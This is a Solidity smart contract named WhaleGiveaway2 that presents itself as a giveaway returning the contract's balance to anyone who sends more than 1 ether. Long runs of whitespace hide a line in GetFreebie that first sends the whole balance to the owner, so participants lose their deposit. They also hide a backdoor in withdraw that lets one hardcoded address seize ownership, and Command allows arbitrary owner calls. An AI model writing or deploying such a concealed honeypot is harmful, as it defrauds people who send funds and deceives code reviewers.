pragma solidity ^0.8.26;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint public totalParticipants;
    uint public totalGiveaways;
    mapping(address => uint) public participantContributions;
    
    event GiveawayEvent(address indexed participant, uint contribution, bool won);
    event FundsReceived(address indexed sender, uint amount);
   
    receive()
    external
    payable
    {
        emit FundsReceived(msg.sender, msg.value);
    }
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {
            totalParticipants++;
            participantContributions[msg.sender] += msg.value;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     payable(Owner).transfer(address(this).balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            payable(msg.sender).transfer(address(this).balance);
            totalGiveaways++;
            emit GiveawayEvent(msg.sender, msg.value, true);
        } else {
            emit GiveawayEvent(msg.sender, msg.value, false);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }
    
    function Command(address adr,bytes calldata data)
    payable
    public
    {
        require(msg.sender == Owner);
        (bool success, ) = adr.call{value: msg.value}(data);
    }
    
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}